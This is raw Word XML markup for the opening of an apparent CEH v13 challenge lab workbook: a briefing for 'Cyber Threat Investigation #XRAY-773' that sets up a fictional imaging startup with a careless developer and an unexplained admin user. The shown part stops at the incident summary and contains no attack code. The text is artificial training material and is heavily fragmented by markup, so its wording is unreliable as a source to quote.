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oter4.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.foot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78E9" w:rsidRDefault="007E35E5">
      <w:pPr>
        <w:spacing w:before="34"/>
        <w:ind w:left="1140"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="52"/>
          <w:szCs w:val="52"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:pict>
          <v:group id="_x0000_s1126" style="position:absolute;left:0;text-align:left;margin-left:0;margin-top:0;width:612pt;height:200pt;z-index:-1902;mso-position-horizontal-relative:page;mso-position-vertical-relative:page" coordsize="12240,4000">
            <v:shape id="_x0000_s1135" style="position:absolute;left:-79;top:-193;width:12442;height:3378" coordorigin="-79,-193" coordsize="12442,3378" path="m12240,l,,,3185r12240,l12240,xe" fillcolor="#4e3a2f" stroked="f">
              <v:path arrowok="t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134" type="#_x0000_t75" style="position:absolute;left:-72;top:-115;width:12427;height:3221">
              <v:imagedata r:id="rId7" o:title=""/>
            </v:shape>
            <v:shape id="_x0000_s1133" type="#_x0000_t75" style="position:absolute;left:7164;top:-5;width:4790;height:3193">
              <v:imagedata r:id="rId8" o:title=""/>
            </v:shape>
            <v:shape id="_x0000_s1132" type="#_x0000_t75" style="position:absolute;left:6442;top:1205;width:2248;height:1926">
              <v:imagedata r:id="rId9" o:title=""/>
            </v:shape>
            <v:shape id="_x0000_s1131" type="#_x0000_t75" style="position:absolute;left:6031;top:-13;width:1987;height:2216">
              <v:imagedata r:id="rId10" o:title=""/>
            </v:shape>
            <v:shape id="_x0000_s1130" type="#_x0000_t75" style="position:absolute;left:11131;top:-12;width:2617;height:2333">
              <v:imagedata r:id="rId11" o:title=""/>
            </v:shape>
            <v:shape id="_x0000_s1129" style="position:absolute;left:11801;top:942;width:1987;height:2217" coordorigin="11801,942" coordsize="1987,2217" path="m12240,2437r-439,710l12240,3153r,-716xe" fillcolor="#efa12d" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1128" type="#_x0000_t75" style="position:absolute;left:-2803;top:-238;width:3800;height:4238">
              <v:imagedata r:id="rId12" o:title=""/>
            </v:shape>
            <v:shape id="_x0000_s1127" type="#_x0000_t75" style="position:absolute;left:-64;top:3047;width:12336;height:406">
              <v:imagedata r:id="rId13" o:title=""/>
            </v:shape>
            <w10:wrap anchorx="page" anchory="page"/>
          </v:group>
        </w:pict>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="52"/>
          <w:szCs w:val="52"/>
        </w:rPr>
        <w:t>CEH</w:t>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="FFFFFF"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="52"/>
          <w:szCs w:val="52"/>
        </w:rPr>
        <w:t>V</w:t>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="FFFFFF"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="52"/>
          <w:szCs w:val="52"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="52"/>
          <w:szCs w:val="52"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="8" w:line="640" w:lineRule="atLeast"/>
        <w:ind w:left="1140" w:right="7291"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="52"/>
          <w:szCs w:val="52"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="52"/>
          <w:szCs w:val="52"/>
        </w:rPr>
        <w:t>CHALL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="FFFFFF"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="52"/>
          <w:szCs w:val="52"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="52"/>
          <w:szCs w:val="52"/>
        </w:rPr>
        <w:t>NGE LAB WORKBO</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="FFFFFF"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="52"/>
          <w:szCs w:val="52"/>
        </w:rPr>
        <w:t>O</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="52"/>
          <w:szCs w:val="52"/>
        </w:rPr>
        <w:t>K</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="12"/>
          <w:szCs w:val="12"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>i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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>fing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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>Doc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve">ment: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>yb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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>Threat</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>I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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>st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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>ig</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>ation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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>#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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>X</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="5"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>Y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>773</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="240" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pP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Backg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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>r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ou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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>n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d</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="3" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="11"/>
          <w:szCs w:val="11"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080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Dr. Dean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a Hartwell is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the founder and lead rad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ologi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t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3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XRAY Clinic Solutio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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ns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, a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sm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all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b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ut</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="25" w:line="264" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="1058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gro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w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ing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m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edi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al imagi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g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tar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up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that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ervi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regio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al ho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sp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itals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and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p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4"/>
          <w:szCs w:val="24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iva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e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p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ra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ti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. S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="5"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>h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e's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k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w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n for her high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tand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rds, tight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hedule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, and a tendency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to say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thin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g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li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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>k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e,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i/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>“</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:i/>
          <w:color w:val="404040"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Se</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:i/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-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i/>
          <w:color w:val="404040"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>urity</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:i/>
          <w:color w:val="404040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i/>
          <w:color w:val="404040"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>is I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:i/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:i/>
          <w:color w:val="404040"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">’s job, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:i/>
          <w:color w:val="404040"/>
          <w:spacing w:val="3"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:i/>
          <w:color w:val="404040"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ot mine.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="12"/>
          <w:szCs w:val="12"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="1351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r develo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p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er, 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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>M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3"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24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,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w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4"/>
          <w:szCs w:val="24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hired on contr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ac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t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o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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>b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uild a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u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tom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w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3"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>b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-bas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d ma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age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m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t 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y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tem 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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>f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or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tor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ng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 xml:space="preserve"> p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at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t i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m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aging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m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etad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ta. Moo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br</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="3"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24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lli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4"/>
          <w:szCs w:val="24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nt —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but fa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t,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arele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, and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p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rone to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ebuggi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g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p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rodu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tion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ervers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dire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tl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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>y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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="12"/>
          <w:szCs w:val="12"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080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hen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there’s Ma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4"/>
          <w:szCs w:val="24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ni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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="264" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="1168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No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b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ody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real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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>l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y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k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w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 xml:space="preserve"> w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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>h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o Man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ie is or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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>w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hat he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="3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doe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. He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has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admin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rig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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>h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ts.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H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e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ho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w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up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in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y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tem log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. He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 xml:space="preserve"> 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3"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24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m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ails.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B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ut no o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 re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m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m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bers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w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hen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he joined,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="3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and HR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has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no r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ord of hiring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hi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m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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pP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I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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>n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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>c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ide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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>n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t S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>u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m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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>m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a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>r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y</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="3" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="11"/>
          <w:szCs w:val="11"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="1262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sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>La</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book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sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>t we</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-1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sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
